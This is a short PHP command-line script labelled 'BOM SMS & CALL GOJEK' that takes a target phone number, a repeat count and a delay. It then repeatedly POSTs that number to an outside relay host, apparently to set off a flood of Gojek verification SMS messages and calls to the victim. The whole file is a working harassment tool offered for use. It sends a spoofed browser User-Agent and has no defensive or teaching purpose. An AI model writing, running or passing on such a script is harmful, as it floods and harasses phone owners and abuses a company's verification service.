<?php
//@sandro.putraa
function cat($no, $jumlah, $wait){
    $x = 0; 
    while($x < $jumlah) {
		
		$body = 'no='.$no.'';
				
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://api-sandro-krisandromartinus.c9users.io/gojek.php");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array("Host: api-sandro-krisandromartinus.c9users.io","User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"));
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
print "BOM SMS & CALL GOJEK\n\n";
echo "NO HP ? (ex +6281226980609)\nInput : ";
$no = trim(fgets(STDIN));
echo "Jumlah?\nInput : ";
$jumlah = trim(fgets(STDIN));
echo "Jeda? 0-9999999999 (ex:0)\nInput : ";
$wait = trim(fgets(STDIN));
$execute = cat($no, $jumlah, $wait);
print $execute;
print "DONE ALL SEND\n";
?>
